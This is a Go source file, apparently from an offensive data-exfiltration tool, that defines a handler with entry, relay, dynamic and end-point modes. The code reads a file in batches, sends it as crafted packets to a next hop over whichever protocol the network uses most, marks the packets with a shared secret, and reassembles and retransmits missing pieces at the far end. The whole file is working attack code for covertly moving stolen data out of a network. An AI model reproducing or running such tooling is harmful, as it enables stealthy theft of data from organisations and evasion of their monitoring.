package main

import (
	"fmt"
	"os"
	"strconv"
	"time"
)

var (
	packetGateway = PacketGateway{}
	dh            = DataHealth{}
)

// Custom Exfil Handler object
type ExfilHandler struct {
	cmd CommandArgs
}

// Inital entry point for the main handler
func (handler *ExfilHandler) Run() {

	// Generate Secrets
	generateSecret()

	// check to see if we have an exfil file set
	if handler.cmd.isSetExfilFile() {

		// Perform Exfil as Starting Point
		handler.RunEntryPointMode()

	} else if handler.cmd.IsEndPoint() {

		// Perform Exfil as Ending Point
		handler.RunEndPointMode()
		handler.SleepHandler()

	} else if handler.cmd.isDynamicRun() {

		// Perform Exfil Dynamically
		handler.RunDynamicMode()
		handler.SleepHandler()

	} else {

		// Perform Manual Exfil
		handler.RunManualMode()
		handler.SleepHandler()
	}

}

// Sleep forever TODO - Replace this.
func (handler *ExfilHandler) SleepHandler() {
	for {
		time.Sleep(5 * time.Second)
	}
}

// Final end point mode
func (handler *ExfilHandler) RunEndPointMode() {
	logData("Starting in End Point Mode...", true, false)

	// Start Go Routine for Packet Capture
	go runCapture(handler.cmd.getInterface(), 0, MainChannel)

	// Get Mac Once
	GetRemoteMac(handler.cmd.getNextHop(), handler.cmd.getInterface(), true)

	// Init new ExiflGateway
	exfil := ExfilGateway{}
	exfil.Init(handler.cmd.GetExfilProtocol())

	// init on DH
	dh.Init()

	// Update Exfil Obj on DH
	dh.UpdateExfilGw(exfil)

	// Update device
	dh.UpdateDevice(handler.cmd.getInterface())

	// Init Recv Port/IP
	recvPort := 0
	recvIP := ""

	addedData := false

	for d := range MainChannel {

		logData("Data Recieved. Parsing...", true, false)

		for i := 0; i <= d.Size(); i++ {
			packet := d.Pop()

			if packet.PacketType == "TCP" {

				// Identify Secret In Packet
				if IsSecretFound(packet) {

					// Make sure the packet is not from itself
					if packet.sourceIP != GetLocalIP() {

						// Handle Update to Recv Info
						dh.UpdateRecvIP(recvIP)
						dh.UpdateRecvPort(recvPort)

						// Add Recv Data to DataHealth
						seqNum, _ := strconv.Atoi(string(GetSeqNum(packet.rawData)))

						if checkEOF(packet.rawData) {
							fmt.Println("Recieved EOF: ", seqNum)
						}

						// Add the data that was recv to the DataHealth obj and set addedData to true
						dh.AddRecv(seqNum, packet.rawData)
						addedData = true

						// Check to see if we have everything and run exfil
						if dh.IsMissingData() == false && dh.EOFFound() {
							// Handle packet for ExfilGateway
							logData("Exfil is Writting Data...", true, false)
							dh.Exfil()
							logData("Exfil is Complete...", true, false)
							os.Exit(0)
						}

						// Reset the port
						recvPort = packet.toPort
						recvIP = packet.sourceIP

					}

				}

			}
		}

		// Check to see if we did not recv data this pass and that we have set our recvIP & port
		if addedData == false && recvPort != 0 && recvIP != "" {

			// Handle if we Dont have EOF but have no missing data
			if dh.IsMissingData() == false && dh.EOFFound() == false {
				dh.RequestMissingPacketsFromX()
			}

			// Check if we are missing data
			if dh.IsMissingData() {
				// Update RecvPort
				dh.UpdateRecvPort(recvPort)

				// Update RecvIP
				dh.UpdateRecvIP(recvIP)

				// Request the Data again
				dh.RequestMissingPackets()
			}
		}

		addedData = false
	}

}

// Handle the entry point for sending the data
func (handler *ExfilHandler) RunEntryPointMode() {

	logData("Starting in Entry Point Mode...", true, false)

	// Get Mac Once
	GetRemoteMac(handler.cmd.getNextHop(), handler.cmd.getInterface(), true)

	// Start Go Routine for Packet Capture
	go runCapture(handler.cmd.getInterface(), 0, MainChannel)

	// init on DH
	dh.Init()

	// Update device
	dh.UpdateDevice(handler.cmd.getInterface())

	// Update SendPort
	dh.UpdateSendPort(mapPortByProtocol(handler.cmd.getRemoteProtocol()))

	// Update SendIP
	dh.UpdateSendIP(handler.cmd.getNextHop())

	// Set Current Seq #
	currentSeq := OFFSETSTART

	// Load up File for Exfil
	fl := FileLoader{}
	fl.LoadFile(handler.cmd.GetExfilFile(), FileBatchSize)

	if handler.cmd.isDynamicRun() {

		// Identify the most used protocol
		protocol := RunProtocolIdentify(handler.cmd)

		for {

			// Inc Seq #
			currentSeq = IncSeqNum(currentSeq)

			byteBatch := fl.NextBatch()

			seqNum, _ := strconv.Atoi(currentSeq)

			// Check to see if we are at the last section of the data
			if len(byteBatch) < fl.batchSize {
				dh.AddSent(seqNum, byteBatch)
				packetGateway.SendPacket(mapPortByProtocol(protocol), handler.cmd.getNextHop(), byteBatch, handler.cmd.getInterface(), true, currentSeq, false, false)
				break
			}

			// Add data to sent data in DH
			dh.AddSent(seqNum, byteBatch)
			packetGateway.SendPacket(mapPortByProtocol(protocol), handler.cmd.getNextHop(), byteBatch, handler.cmd.getInterface(), false, currentSeq, false, false)
		}

	} else {

		logData("Manual Mode Enabled...", true, false)
		logData("Using Interface: "+handler.cmd.getInterface(), true, false)
		logData("Next Hop: "+handler.cmd.getNextHop(), true, false)
		logData("Starting Exfil Morty...", true, false)

		for {

			// Inc Seq #
			currentSeq = IncSeqNum(currentSeq)

			byteBatch := fl.NextBatch()

			seqNum, _ := strconv.Atoi(currentSeq)

			// Check to see if we are at the last section of the data
			if len(byteBatch) < fl.batchSize {
				dh.AddSent(seqNum, byteBatch)
				packetGateway.SendPacket(mapPortByProtocol(handler.cmd.getRemoteProtocol()), handler.cmd.getNextHop(), byteBatch, handler.cmd.getInterface(), true, currentSeq, false, false)
				break
			}
			dh.AddSent(seqNum, byteBatch)
			packetGateway.SendPacket(mapPortByProtocol(handler.cmd.getRemoteProtocol()), handler.cmd.getNextHop(), byteBatch, handler.cmd.getInterface(), false, currentSeq, false, false)
		}
	}

	// Handle Listening for the Request for Retrans
	logData("Starting ReTransmission...", true, false)
	dh.ReTransmission()

}

func (handler *ExfilHandler) RunDynamicMode() {

	logData("Starting in Dynamic Mode...", true, false)

	// Get Mac Once
	GetRemoteMac(handler.cmd.getNextHop(), handler.cmd.getInterface(), true)

	// Get Most Used Protocol
	protocol := RunProtocolIdentify(handler.cmd)
	logData("Best Protocol Identified as "+protocol, true, false)
	logData("Using Interface: "+handler.cmd.getInterface(), true, false)
	logData("Next Hop: "+handler.cmd.getNextHop(), true, false)
	logData("Starting Exfil Morty...", true, false)

	// Start Go Routine for Packet Capture
	go runCapture(handler.cmd.getInterface(), 0, MainChannel)

	// Configure DH
	// init on DH
	dh.Init()

	// Update device
	dh.UpdateDevice(handler.cmd.getInterface())

	// Update SendPort
	dh.UpdateSendPort(mapPortByProtocol(protocol))

	// Update SendIP
	dh.UpdateSendIP(handler.cmd.getNextHop())

	// Start Forwarder using Dynamically Found Protocol
	go StartForwarder(MainChannel, handler.cmd.getNextHop(), handler.cmd.getInterface(), mapPortByProtocol(protocol), packetGateway, handler.cmd, dh)

}

func (handler *ExfilHandler) RunManualMode() {

	// Get Mac Once
	GetRemoteMac(handler.cmd.getNextHop(), handler.cmd.getInterface(), true)

	logData("Starting in Manual Mode...", true, false)
	logData("Using Interface: "+handler.cmd.getInterface(), true, false)
	logData("Next Hop: "+handler.cmd.getNextHop(), true, false)
	logData("Starting Exfil Morty...", true, false)

	// Start Go Routine for Packet Capture
	go runCapture(handler.cmd.getInterface(), 0, MainChannel)

	// Configure DH
	// init on DH
	dh.Init()

	// Update device
	dh.UpdateDevice(handler.cmd.getInterface())

	// Update SendPort
	dh.UpdateSendPort(mapPortByProtocol(handler.cmd.getRemoteProtocol()))

	// Update SendIP
	dh.UpdateSendIP(handler.cmd.getNextHop())

	// Start Forwarder using specific protocol
	go StartForwarder(MainChannel, handler.cmd.getNextHop(), handler.cmd.getInterface(), mapPortByProtocol(handler.cmd.getRemoteProtocol()), packetGateway, handler.cmd, dh)
}
